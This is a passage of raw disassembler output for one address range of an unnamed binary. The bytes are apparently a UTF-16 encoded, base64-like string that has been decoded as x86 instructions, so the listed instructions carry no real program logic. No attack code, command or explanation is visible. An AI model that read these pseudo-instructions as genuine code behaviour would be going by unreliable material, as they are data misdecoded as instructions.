  40b3bb:	77 00                	ja     0x40b3bd
  40b3bd:	46                   	inc    %esi
  40b3be:	00 6a 00             	add    %ch,0x0(%edx)
  40b3c1:	38 00                	cmp    %al,(%eax)
  40b3c3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3c4:	00 57 00             	add    %dl,0x0(%edi)
  40b3c7:	2f                   	das
  40b3c8:	00 6d 00             	add    %ch,0x0(%ebp)
  40b3cb:	63 00                	arpl   %eax,(%eax)
  40b3cd:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40b3d1:	78 00                	js     0x40b3d3
  40b3d3:	55                   	push   %ebp
  40b3d4:	00 4f 00             	add    %cl,0x0(%edi)
  40b3d7:	57                   	push   %edi
  40b3d8:	00 4d 00             	add    %cl,0x0(%ebp)
  40b3db:	51                   	push   %ecx
  40b3dc:	00 72 00             	add    %dh,0x0(%edx)
  40b3df:	72 00                	jb     0x40b3e1
  40b3e1:	57                   	push   %edi
  40b3e2:	00 62 00             	add    %ah,0x0(%edx)
  40b3e5:	79 00                	jns    0x40b3e7
  40b3e7:	51                   	push   %ecx
  40b3e8:	00 52 00             	add    %dl,0x0(%edx)
  40b3eb:	52                   	push   %edx
  40b3ec:	00 65 00             	add    %ah,0x0(%ebp)
  40b3ef:	33 00                	xor    (%eax),%eax
  40b3f1:	57                   	push   %edi
  40b3f2:	00 31                	add    %dh,(%ecx)
  40b3f4:	00 2f                	add    %ch,(%edi)
  40b3f6:	00 59 00             	add    %bl,0x0(%ecx)
  40b3f9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3fa:	00 48 00             	add    %cl,0x0(%eax)
  40b3fd:	62 00                	bound  %eax,(%eax)
  40b3ff:	78 00                	js     0x40b401
  40b401:	73 00                	jae    0x40b403
  40b403:	49                   	dec    %ecx
  40b404:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40b408:	00 51 00             	add    %dl,0x0(%ecx)
  40b40b:	52                   	push   %edx
  40b40c:	00 45 00             	add    %al,0x0(%ebp)
  40b40f:	54                   	push   %esp
  40b410:	00 72 00             	add    %dh,0x0(%edx)
  40b413:	57                   	push   %edi
  40b414:	00 33                	add    %dh,(%ebx)
  40b416:	00 49 00             	add    %cl,0x0(%ecx)
  40b419:	74 00                	je     0x40b41b
  40b41b:	6a 00                	push   $0x0
  40b41d:	4d                   	dec    %ebp
  40b41e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b421:	30 00                	xor    %al,(%eax)
  40b423:	70 00                	jo     0x40b425
  40b425:	69 00 53 00 69 00    	imul   $0x690053,(%eax),%eax
  40b42b:	75 00                	jne    0x40b42d
  40b42d:	38 00                	cmp    %al,(%eax)
  40b42f:	56                   	push   %esi
  40b430:	00 72 00             	add    %dh,0x0(%edx)
  40b433:	49                   	dec    %ecx
  40b434:	00 41 00             	add    %al,0x0(%ecx)
  40b437:	33 00                	xor    (%eax),%eax
  40b439:	52                   	push   %edx
  40b43a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b43d:	6c                   	insb   (%dx),%es:(%edi)
  40b43e:	00 69 00             	add    %ch,0x0(%ecx)
  40b441:	2b 00                	sub    (%eax),%eax
  40b443:	71 00                	jno    0x40b445
  40b445:	59                   	pop    %ecx
  40b446:	00 51 00             	add    %dl,0x0(%ecx)
  40b449:	33 00                	xor    (%eax),%eax
  40b44b:	69 00 66 00 37 00    	imul   $0x370066,(%eax),%eax
  40b451:	4f                   	dec    %edi
  40b452:	00 31                	add    %dh,(%ecx)
  40b454:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  40b458:	00 6f 00             	add    %ch,0x0(%edi)
  40b45b:	62 00                	bound  %eax,(%eax)
  40b45d:	45                   	inc    %ebp
  40b45e:	00 65 00             	add    %ah,0x0(%ebp)
  40b461:	76 00                	jbe    0x40b463
  40b463:	4d                   	dec    %ebp
  40b464:	00 6d 00             	add    %ch,0x0(%ebp)
  40b467:	61                   	popa
  40b468:	00 69 00             	add    %ch,0x0(%ecx)
  40b46b:	6b 00 32             	imul   $0x32,(%eax),%eax
  40b46e:	00 48 00             	add    %cl,0x0(%eax)
  40b471:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40b475:	2f                   	das
  40b476:	00 50 00             	add    %dl,0x0(%eax)
  40b479:	77 00                	ja     0x40b47b
  40b47b:	78 00                	js     0x40b47d
  40b47d:	65 00 32             	add    %dh,%gs:(%edx)
  40b480:	00 58 00             	add    %bl,0x0(%eax)
  40b483:	55                   	push   %ebp
  40b484:	00 4e 00             	add    %cl,0x0(%esi)
  40b487:	70 00                	jo     0x40b489
  40b489:	50                   	push   %eax
  40b48a:	00 33                	add    %dh,(%ebx)
  40b48c:	00 49 00             	add    %cl,0x0(%ecx)
  40b48f:	63 00                	arpl   %eax,(%eax)
  40b491:	6a 00                	push   $0x0
  40b493:	43                   	inc    %ebx
  40b494:	00 36                	add    %dh,(%esi)
  40b496:	00 49 00             	add    %cl,0x0(%ecx)
  40b499:	53                   	push   %ebx
  40b49a:	00 33                	add    %dh,(%ebx)
  40b49c:	00 36                	add    %dh,(%esi)
  40b49e:	00 49 00             	add    %cl,0x0(%ecx)
  40b4a1:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b4a5:	61                   	popa
  40b4a6:	00 31                	add    %dh,(%ecx)
  40b4a8:	00 4e 00             	add    %cl,0x0(%esi)
  40b4ab:	73 00                	jae    0x40b4ad
  40b4ad:	30 00                	xor    %al,(%eax)
  40b4af:	2f                   	das
  40b4b0:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4b3:	6b 00 74             	imul   $0x74,(%eax),%eax
  40b4b6:	00 73 00             	add    %dh,0x0(%ebx)
  40b4b9:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40b4bc:	00 2f                	add    %ch,(%edi)
  40b4be:	00 46 00             	add    %al,0x0(%esi)
  40b4c1:	74 00                	je     0x40b4c3
  40b4c3:	46                   	inc    %esi
  40b4c4:	00 57 00             	add    %dl,0x0(%edi)
  40b4c7:	79 00                	jns    0x40b4c9
  40b4c9:	61                   	popa
  40b4ca:	00 61 00             	add    %ah,0x0(%ecx)
  40b4cd:	71 00                	jno    0x40b4cf
  40b4cf:	78 00                	js     0x40b4d1
  40b4d1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4d2:	00 67 00             	add    %ah,0x0(%edi)
  40b4d5:	4e                   	dec    %esi
  40b4d6:	00 51 00             	add    %dl,0x0(%ecx)
  40b4d9:	37                   	aaa
  40b4da:	00 47 00             	add    %al,0x0(%edi)
  40b4dd:	75 00                	jne    0x40b4df
  40b4df:	34 00                	xor    $0x0,%al
  40b4e1:	44                   	inc    %esp
  40b4e2:	00 58 00             	add    %bl,0x0(%eax)
  40b4e5:	42                   	inc    %edx
  40b4e6:	00 61 00             	add    %ah,0x0(%ecx)
  40b4e9:	71 00                	jno    0x40b4eb
  40b4eb:	69 00 62 00 66 00    	imul   $0x660062,(%eax),%eax
  40b4f1:	75 00                	jne    0x40b4f3
  40b4f3:	30 00                	xor    %al,(%eax)
  40b4f5:	78 00                	js     0x40b4f7
  40b4f7:	38 00                	cmp    %al,(%eax)
  40b4f9:	4b                   	dec    %ebx
  40b4fa:	00 37                	add    %dh,(%edi)
  40b4fc:	00 78 00             	add    %bh,0x0(%eax)
  40b4ff:	61                   	popa
  40b500:	00 53 00             	add    %dl,0x0(%ebx)
  40b503:	77 00                	ja     0x40b505
  40b505:	58                   	pop    %eax
  40b506:	00 37                	add    %dh,(%edi)
  40b508:	00 30                	add    %dh,(%eax)
  40b50a:	00 46 00             	add    %al,0x0(%esi)
  40b50d:	36 00 54 00 46       	add    %dl,%ss:0x46(%eax,%eax,1)
  40b512:	00 66 00             	add    %ah,0x0(%esi)
  40b515:	76 00                	jbe    0x40b517
  40b517:	38 00                	cmp    %al,(%eax)
  40b519:	74 00                	je     0x40b51b
  40b51b:	4c                   	dec    %esp
  40b51c:	00 35 00 75 00 34    	add    %dh,0x34007500
  40b522:	00 4a 00             	add    %cl,0x0(%edx)
  40b525:	74 00                	je     0x40b527
  40b527:	4a                   	dec    %edx
  40b528:	00 4e 00             	add    %cl,0x0(%esi)
  40b52b:	62 00                	bound  %eax,(%eax)
  40b52d:	6a 00                	push   $0x0
  40b52f:	6c                   	insb   (%dx),%es:(%edi)
  40b530:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  40b534:	00 41 00             	add    %al,0x0(%ecx)
  40b537:	51                   	push   %ecx
  40b538:	00 52 00             	add    %dl,0x0(%edx)
  40b53b:	7a 00                	jp     0x40b53d
  40b53d:	2b 00                	sub    (%eax),%eax
  40b53f:	76 00                	jbe    0x40b541
  40b541:	42                   	inc    %edx
  40b542:	00 63 00             	add    %ah,0x0(%ebx)
  40b545:	48                   	dec    %eax
  40b546:	00 68 00             	add    %ch,0x0(%eax)
  40b549:	35 00 66 00 74       	xor    $0x74006600,%eax
  40b54e:	00 4f 00             	add    %cl,0x0(%edi)
  40b551:	74 00                	je     0x40b553
  40b553:	4d                   	dec    %ebp
  40b554:	00 79 00             	add    %bh,0x0(%ecx)
  40b557:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40b55b:	4c                   	dec    %esp
  40b55c:	00 59 00             	add    %bl,0x0(%ecx)
  40b55f:	30 00                	xor    %al,(%eax)
  40b561:	74 00                	je     0x40b563
  40b563:	49                   	dec    %ecx
  40b564:	00 6f 00             	add    %ch,0x0(%edi)
  40b567:	47                   	inc    %edi
  40b568:	00 30                	add    %dh,(%eax)
  40b56a:	00 4b 00             	add    %cl,0x0(%ebx)
  40b56d:	39 00                	cmp    %eax,(%eax)
  40b56f:	34 00                	xor    $0x0,%al
  40b571:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40b575:	37                   	aaa
  40b576:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  40b57a:	00 73 00             	add    %dh,0x0(%ebx)
  40b57d:	45                   	inc    %ebp
  40b57e:	00 39                	add    %bh,(%ecx)
  40b580:	00 30                	add    %dh,(%eax)
  40b582:	00 78 00             	add    %bh,0x0(%eax)
  40b585:	62 00                	bound  %eax,(%eax)
  40b587:	36 00 38             	add    %bh,%ss:(%eax)
  40b58a:	00 31                	add    %dh,(%ecx)
  40b58c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b590:	00 45 00             	add    %al,0x0(%ebp)
  40b593:	44                   	inc    %esp
  40b594:	00 6f 00             	add    %ch,0x0(%edi)
  40b597:	55                   	push   %ebp
  40b598:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b59b:	2b 00                	sub    (%eax),%eax
  40b59d:	33 00                	xor    (%eax),%eax
  40b59f:	69 00 43 00 71 00    	imul   $0x710043,(%eax),%eax
  40b5a5:	32 00                	xor    (%eax),%al
  40b5a7:	56                   	push   %esi
  40b5a8:	00 5a 00             	add    %bl,0x0(%edx)
  40b5ab:	69 00 34 00 55 00    	imul   $0x550034,(%eax),%eax
  40b5b1:	76 00                	jbe    0x40b5b3
  40b5b3:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40b5b6:	00 6b 00             	add    %ch,0x0(%ebx)
  40b5b9:	44                   	inc    %esp
  40b5ba:	00 76 00             	add    %dh,0x0(%esi)
  40b5bd:	74 00                	je     0x40b5bf
  40b5bf:	2b 00                	sub    (%eax),%eax
  40b5c1:	53                   	push   %ebx
  40b5c2:	00 66 00             	add    %ah,0x0(%esi)
  40b5c5:	4b                   	dec    %ebx
  40b5c6:	00 33                	add    %dh,(%ebx)
  40b5c8:	00 5a 00             	add    %bl,0x0(%edx)
  40b5cb:	79 00                	jns    0x40b5cd
  40b5cd:	69 00 6b 00 4e 00    	imul   $0x4e006b,(%eax),%eax
  40b5d3:	69 00 72 00 33 00    	imul   $0x330072,(%eax),%eax
  40b5d9:	62 00                	bound  %eax,(%eax)
  40b5db:	59                   	pop    %ecx
  40b5dc:	00 38                	add    %bh,(%eax)
  40b5de:	00 6e 00             	add    %ch,0x0(%esi)
  40b5e1:	37                   	aaa
  40b5e2:	00 6e 00             	add    %ch,0x0(%esi)
  40b5e5:	77 00                	ja     0x40b5e7
  40b5e7:	57                   	push   %edi
  40b5e8:	00 41 00             	add    %al,0x0(%ecx)
  40b5eb:	50                   	push   %eax
  40b5ec:	00 62 00             	add    %ah,0x0(%edx)
  40b5ef:	54                   	push   %esp
  40b5f0:	00 33                	add    %dh,(%ebx)
  40b5f2:	00 32                	add    %dh,(%edx)
  40b5f4:	00 41 00             	add    %al,0x0(%ecx)
  40b5f7:	57                   	push   %edi
  40b5f8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5fb:	6a 00                	push   $0x0
  40b5fd:	53                   	push   %ebx
  40b5fe:	00 30                	add    %dh,(%eax)
  40b600:	00 58 00             	add    %bl,0x0(%eax)
  40b603:	68 00 71 00 64       	push   $0x64007100
  40b608:	00 70 00             	add    %dh,0x0(%eax)
  40b60b:	4c                   	dec    %esp
  40b60c:	00 66 00             	add    %ah,0x0(%esi)
  40b60f:	76 00                	jbe    0x40b611
  40b611:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40b615:	34 00                	xor    $0x0,%al
  40b617:	4f                   	dec    %edi
  40b618:	00 38                	add    %bh,(%eax)
  40b61a:	00 6a 00             	add    %ch,0x0(%edx)
  40b61d:	62 00                	bound  %eax,(%eax)
  40b61f:	79 00                	jns    0x40b621
  40b621:	68 00 2f 00 37       	push   $0x37002f00
  40b626:	00 78 00             	add    %bh,0x0(%eax)
  40b629:	34 00                	xor    $0x0,%al
  40b62b:	58                   	pop    %eax
  40b62c:	00 6f 00             	add    %ch,0x0(%edi)
  40b62f:	31 00                	xor    %eax,(%eax)
  40b631:	33 00                	xor    (%eax),%eax
  40b633:	4f                   	dec    %edi
  40b634:	00 69 00             	add    %ch,0x0(%ecx)
  40b637:	4b                   	dec    %ebx
  40b638:	00 75 00             	add    %dh,0x0(%ebp)
  40b63b:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40b63e:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40b642:	00 7a 00             	add    %bh,0x0(%edx)
  40b645:	2b 00                	sub    (%eax),%eax
  40b647:	48                   	dec    %eax
  40b648:	00 45 00             	add    %al,0x0(%ebp)
  40b64b:	61                   	popa
  40b64c:	00 67 00             	add    %ah,0x0(%edi)
  40b64f:	56                   	push   %esi
  40b650:	00 56 00             	add    %dl,0x0(%esi)
  40b653:	45                   	inc    %ebp
  40b654:	00 68 00             	add    %ch,0x0(%eax)
  40b657:	52                   	push   %edx
  40b658:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40b65c:	00 45 00             	add    %al,0x0(%ebp)
  40b65f:	30 00                	xor    %al,(%eax)
  40b661:	68 00 51 00 42       	push   $0x42005100
  40b666:	00 65 00             	add    %ah,0x0(%ebp)
  40b669:	39 00                	cmp    %eax,(%eax)
  40b66b:	31 00                	xor    %eax,(%eax)
  40b66d:	6a 00                	push   $0x0
  40b66f:	44                   	inc    %esp
  40b670:	00 68 00             	add    %ch,0x0(%eax)
  40b673:	59                   	pop    %ecx
  40b674:	00 50 00             	add    %dl,0x0(%eax)
  40b677:	63 00                	arpl   %eax,(%eax)
  40b679:	34 00                	xor    $0x0,%al
  40b67b:	43                   	inc    %ebx
  40b67c:	00 67 00             	add    %ah,0x0(%edi)
  40b67f:	61                   	popa
  40b680:	00 4e 00             	add    %cl,0x0(%esi)
  40b683:	4c                   	dec    %esp
  40b684:	00 75 00             	add    %dh,0x0(%ebp)
  40b687:	43                   	inc    %ebx
  40b688:	00 50 00             	add    %dl,0x0(%eax)
  40b68b:	55                   	push   %ebp
  40b68c:	00 72 00             	add    %dh,0x0(%edx)
  40b68f:	37                   	aaa
  40b690:	00 50 00             	add    %dl,0x0(%eax)
  40b693:	65 00 33             	add    %dh,%gs:(%ebx)
  40b696:	00 6b 00             	add    %ch,0x0(%ebx)
  40b699:	73 00                	jae    0x40b69b
  40b69b:	77 00                	ja     0x40b69d
  40b69d:	6a 00                	push   $0x0
  40b69f:	6d                   	insl   (%dx),%es:(%edi)
  40b6a0:	00 63 00             	add    %ah,0x0(%ebx)
  40b6a3:	6d                   	insl   (%dx),%es:(%edi)
  40b6a4:	00 30                	add    %dh,(%eax)
  40b6a6:	00 43 00             	add    %al,0x0(%ebx)
  40b6a9:	61                   	popa
  40b6aa:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  40b6ae:	00 51 00             	add    %dl,0x0(%ecx)
  40b6b1:	49                   	dec    %ecx
  40b6b2:	00 51 00             	add    %dl,0x0(%ecx)
  40b6b5:	58                   	pop    %eax
  40b6b6:	00 59 00             	add    %bl,0x0(%ecx)
  40b6b9:	4a                   	dec    %edx
  40b6ba:	00 30                	add    %dh,(%eax)
  40b6bc:	00 65 00             	add    %ah,0x0(%ebp)
  40b6bf:	4f                   	dec    %edi
  40b6c0:	00 4e 00             	add    %cl,0x0(%esi)
  40b6c3:	79 00                	jns    0x40b6c5
  40b6c5:	49                   	dec    %ecx
  40b6c6:	00 31                	add    %dh,(%ecx)
  40b6c8:	00 78 00             	add    %bh,0x0(%eax)
  40b6cb:	35 00 55 00 31       	xor    $0x31005500,%eax
  40b6d0:	00 70 00             	add    %dh,0x0(%eax)
  40b6d3:	59                   	pop    %ecx
  40b6d4:	00 53 00             	add    %dl,0x0(%ebx)
  40b6d7:	68 00 48 00 74       	push   $0x74004800
  40b6dc:	00 7a 00             	add    %bh,0x0(%edx)
  40b6df:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40b6e3:	41                   	inc    %ecx
  40b6e4:	00 4a 00             	add    %cl,0x0(%edx)
  40b6e7:	76 00                	jbe    0x40b6e9
  40b6e9:	68 00 33 00 69       	push   $0x69003300
  40b6ee:	00 47 00             	add    %al,0x0(%edi)
  40b6f1:	62 00                	bound  %eax,(%eax)
  40b6f3:	75 00                	jne    0x40b6f5
  40b6f5:	75 00                	jne    0x40b6f7
  40b6f7:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6f8:	00 61 00             	add    %ah,0x0(%ecx)
  40b6fb:	31 00                	xor    %eax,(%eax)
  40b6fd:	41                   	inc    %ecx
  40b6fe:	00 61 00             	add    %ah,0x0(%ecx)
  40b701:	68 00 61 00 55       	push   $0x55006100
  40b706:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  40b70a:	00 61 00             	add    %ah,0x0(%ecx)
  40b70d:	47                   	inc    %edi
  40b70e:	00 2b                	add    %ch,(%ebx)
  40b710:	00 58 00             	add    %bl,0x0(%eax)
  40b713:	73 00                	jae    0x40b715
  40b715:	43                   	inc    %ebx
  40b716:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40b71a:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40b71e:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  40b722:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40b726:	00 53 00             	add    %dl,0x0(%ebx)
  40b729:	59                   	pop    %ecx
  40b72a:	00 6e 00             	add    %ch,0x0(%esi)
  40b72d:	6a 00                	push   $0x0
  40b72f:	41                   	inc    %ecx
  40b730:	00 55 00             	add    %dl,0x0(%ebp)
  40b733:	49                   	dec    %ecx
  40b734:	00 51 00             	add    %dl,0x0(%ecx)
  40b737:	4b                   	dec    %ebx
  40b738:	00 6e 00             	add    %ch,0x0(%esi)
  40b73b:	46                   	inc    %esi
  40b73c:	00 59 00             	add    %bl,0x0(%ecx)
  40b73f:	41                   	inc    %ecx
  40b740:	00 56 00             	add    %dl,0x0(%esi)
  40b743:	43                   	inc    %ebx
  40b744:	00 6e 00             	add    %ch,0x0(%esi)
  40b747:	37                   	aaa
  40b748:	00 31                	add    %dh,(%ecx)
  40b74a:	00 59 00             	add    %bl,0x0(%ecx)
  40b74d:	4d                   	dec    %ebp
  40b74e:	00 50 00             	add    %dl,0x0(%eax)
  40b751:	39 00                	cmp    %eax,(%eax)
  40b753:	59                   	pop    %ecx
  40b754:	00 7a 00             	add    %bh,0x0(%edx)
  40b757:	46                   	inc    %esi
  40b758:	00 65 00             	add    %ah,0x0(%ebp)
  40b75b:	31 00                	xor    %eax,(%eax)
  40b75d:	75 00                	jne    0x40b75f
  40b75f:	76 00                	jbe    0x40b761
  40b761:	38 00                	cmp    %al,(%eax)
  40b763:	56                   	push   %esi
  40b764:	00 71 00             	add    %dh,0x0(%ecx)
  40b767:	30 00                	xor    %al,(%eax)
  40b769:	54                   	push   %esp
  40b76a:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  40b76e:	00 5a 00             	add    %bl,0x0(%edx)
  40b771:	4a                   	dec    %edx
  40b772:	00 56 00             	add    %dl,0x0(%esi)
  40b775:	49                   	dec    %ecx
  40b776:	00 66 00             	add    %ah,0x0(%esi)
  40b779:	70 00                	jo     0x40b77b
  40b77b:	63 00                	arpl   %eax,(%eax)
  40b77d:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40b780:	00 61 00             	add    %ah,0x0(%ecx)
  40b783:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40b787:	78 00                	js     0x40b789
  40b789:	48                   	dec    %eax
  40b78a:	00 55 00             	add    %dl,0x0(%ebp)
  40b78d:	35 00 78 00 75       	xor    $0x75007800,%eax
  40b792:	00 33                	add    %dh,(%ebx)
  40b794:	00 69 00             	add    %ch,0x0(%ecx)
  40b797:	72 00                	jb     0x40b799
  40b799:	67 00 44 00          	add    %al,0x0(%si)
  40b79d:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40b7a1:	42                   	inc    %edx
  40b7a2:	00 2b                	add    %ch,(%ebx)
  40b7a4:	00 57 00             	add    %dl,0x0(%edi)
  40b7a7:	62 00                	bound  %eax,(%eax)
  40b7a9:	39 00                	cmp    %eax,(%eax)
  40b7ab:	55                   	push   %ebp
  40b7ac:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b7af:	47                   	inc    %edi
  40b7b0:	00 79 00             	add    %bh,0x0(%ecx)
  40b7b3:	53                   	push   %ebx
  40b7b4:	00 67 00             	add    %ah,0x0(%edi)
  40b7b7:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40b7bb:	47                   	inc    %edi
  40b7bc:	00 42 00             	add    %al,0x0(%edx)
  40b7bf:	4f                   	dec    %edi
  40b7c0:	00 68 00             	add    %ch,0x0(%eax)
  40b7c3:	76 00                	jbe    0x40b7c5
  40b7c5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7c6:	00 37                	add    %dh,(%edi)
  40b7c8:	00 4f 00             	add    %cl,0x0(%edi)
  40b7cb:	4d                   	dec    %ebp
  40b7cc:	00 50 00             	add    %dl,0x0(%eax)
  40b7cf:	32 00                	xor    (%eax),%al
  40b7d1:	4e                   	dec    %esi
  40b7d2:	00 52 00             	add    %dl,0x0(%edx)
  40b7d5:	54                   	push   %esp
  40b7d6:	00 67 00             	add    %ah,0x0(%edi)
  40b7d9:	45                   	inc    %ebp
  40b7da:	00 77 00             	add    %dh,0x0(%edi)
  40b7dd:	46                   	inc    %esi
  40b7de:	00 6f 00             	add    %ch,0x0(%edi)
  40b7e1:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40b7e5:	32 00                	xor    (%eax),%al
  40b7e7:	65 00 36             	add    %dh,%gs:(%esi)
  40b7ea:	00 6f 00             	add    %ch,0x0(%edi)
  40b7ed:	53                   	push   %ebx
  40b7ee:	00 79 00             	add    %bh,0x0(%ecx)
  40b7f1:	2b 00                	sub    (%eax),%eax
  40b7f3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7f4:	00 62 00             	add    %ah,0x0(%edx)
  40b7f7:	37                   	aaa
  40b7f8:	00 55 00             	add    %dl,0x0(%ebp)
  40b7fb:	71 00                	jno    0x40b7fd
  40b7fd:	4c                   	dec    %esp
  40b7fe:	00 4e 00             	add    %cl,0x0(%esi)
  40b801:	38 00                	cmp    %al,(%eax)
  40b803:	49                   	dec    %ecx
  40b804:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b807:	4f                   	dec    %edi
  40b808:	00 62 00             	add    %ah,0x0(%edx)
  40b80b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b80c:	00 32                	add    %dh,(%edx)
  40b80e:	00 71 00             	add    %dh,0x0(%ecx)
  40b811:	76 00                	jbe    0x40b813
  40b813:	73 00                	jae    0x40b815
  40b815:	50                   	push   %eax
  40b816:	00 48 00             	add    %cl,0x0(%eax)
  40b819:	73 00                	jae    0x40b81b
  40b81b:	6d                   	insl   (%dx),%es:(%edi)
  40b81c:	00 6f 00             	add    %ch,0x0(%edi)
  40b81f:	72 00                	jb     0x40b821
  40b821:	55                   	push   %ebp
  40b822:	00 75 00             	add    %dh,0x0(%ebp)
  40b825:	34 00                	xor    $0x0,%al
  40b827:	78 00                	js     0x40b829
  40b829:	59                   	pop    %ecx
  40b82a:	00 65 00             	add    %ah,0x0(%ebp)
  40b82d:	4c                   	dec    %esp
  40b82e:	00 72 00             	add    %dh,0x0(%edx)
  40b831:	53                   	push   %ebx
  40b832:	00 48 00             	add    %cl,0x0(%eax)
  40b835:	43                   	inc    %ebx
  40b836:	00 50 00             	add    %dl,0x0(%eax)
  40b839:	4a                   	dec    %edx
  40b83a:	00 48 00             	add    %cl,0x0(%eax)
  40b83d:	55                   	push   %ebp
  40b83e:	00 46 00             	add    %al,0x0(%esi)
  40b841:	31 00                	xor    %eax,(%eax)
  40b843:	6c                   	insb   (%dx),%es:(%edi)
  40b844:	00 70 00             	add    %dh,0x0(%eax)
  40b847:	47                   	inc    %edi
  40b848:	00 51 00             	add    %dl,0x0(%ecx)
  40b84b:	35 00 47 00 49       	xor    $0x49004700,%eax
  40b850:	00 39                	add    %bh,(%ecx)
  40b852:	00 67 00             	add    %ah,0x0(%edi)
  40b855:	33 00                	xor    (%eax),%eax
  40b857:	70 00                	jo     0x40b859
  40b859:	31 00                	xor    %eax,(%eax)
  40b85b:	53                   	push   %ebx
  40b85c:	00 31                	add    %dh,(%ecx)
  40b85e:	00 7a 00             	add    %bh,0x0(%edx)
  40b861:	7a 00                	jp     0x40b863
  40b863:	78 00                	js     0x40b865
  40b865:	47                   	inc    %edi
  40b866:	00 49 00             	add    %cl,0x0(%ecx)
  40b869:	68 00 68 00 70       	push   $0x70006800
  40b86e:	00 59 00             	add    %bl,0x0(%ecx)
  40b871:	6f                   	outsl  %ds:(%esi),(%dx)
  40b872:	00 68 00             	add    %ch,0x0(%eax)
  40b875:	43                   	inc    %ebx
  40b876:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  40b87a:	00 52 00             	add    %dl,0x0(%edx)
  40b87d:	74 00                	je     0x40b87f
  40b87f:	6b 00 43             	imul   $0x43,(%eax),%eax
  40b882:	00 58 00             	add    %bl,0x0(%eax)
  40b885:	4d                   	dec    %ebp
  40b886:	00 79 00             	add    %bh,0x0(%ecx)
  40b889:	75 00                	jne    0x40b88b
  40b88b:	63 00                	arpl   %eax,(%eax)
  40b88d:	54                   	push   %esp
  40b88e:	00 39                	add    %bh,(%ecx)
  40b890:	00 68 00             	add    %ch,0x0(%eax)
  40b893:	75 00                	jne    0x40b895
  40b895:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40b899:	74 00                	je     0x40b89b
  40b89b:	75 00                	jne    0x40b89d
  40b89d:	70 00                	jo     0x40b89f
  40b89f:	7a 00                	jp     0x40b8a1
  40b8a1:	34 00                	xor    $0x0,%al
  40b8a3:	78 00                	js     0x40b8a5
  40b8a5:	4f                   	dec    %edi
  40b8a6:	00 77 00             	add    %dh,0x0(%edi)
  40b8a9:	39 00                	cmp    %eax,(%eax)
  40b8ab:	4b                   	dec    %ebx
  40b8ac:	00 53 00             	add    %dl,0x0(%ebx)
  40b8af:	48                   	dec    %eax
  40b8b0:	00 76 00             	add    %dh,0x0(%esi)
  40b8b3:	33 00                	xor    (%eax),%eax
  40b8b5:	73 00                	jae    0x40b8b7
  40b8b7:	73 00                	jae    0x40b8b9
  40b8b9:	37                   	aaa
  40b8ba:	00 58 00             	add    %bl,0x0(%eax)
  40b8bd:	59                   	pop    %ecx
  40b8be:	00 49 00             	add    %cl,0x0(%ecx)
  40b8c1:	58                   	pop    %eax
  40b8c2:	00 67 00             	add    %ah,0x0(%edi)
  40b8c5:	38 00                	cmp    %al,(%eax)
  40b8c7:	42                   	inc    %edx
  40b8c8:	00 75 00             	add    %dh,0x0(%ebp)
  40b8cb:	46                   	inc    %esi
  40b8cc:	00 69 00             	add    %ch,0x0(%ecx)
  40b8cf:	64 00 39             	add    %bh,%fs:(%ecx)
  40b8d2:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  40b8d6:	00 2f                	add    %ch,(%edi)
  40b8d8:	00 4d 00             	add    %cl,0x0(%ebp)
  40b8db:	55                   	push   %ebp
  40b8dc:	00 6a 00             	add    %ch,0x0(%edx)
  40b8df:	71 00                	jno    0x40b8e1
  40b8e1:	50                   	push   %eax
  40b8e2:	00 6b 00             	add    %ch,0x0(%ebx)
  40b8e5:	53                   	push   %ebx
  40b8e6:	00 36                	add    %dh,(%esi)
  40b8e8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b8eb:	4a                   	dec    %edx
  40b8ec:	00 66 00             	add    %ah,0x0(%esi)
  40b8ef:	79 00                	jns    0x40b8f1
  40b8f1:	43                   	inc    %ebx
  40b8f2:	00 58 00             	add    %bl,0x0(%eax)
  40b8f5:	36 00 4d 00          	add    %cl,%ss:0x0(%ebp)
  40b8f9:	35 00 73 00 7a       	xor    $0x7a007300,%eax
  40b8fe:	00 66 00             	add    %ah,0x0(%esi)
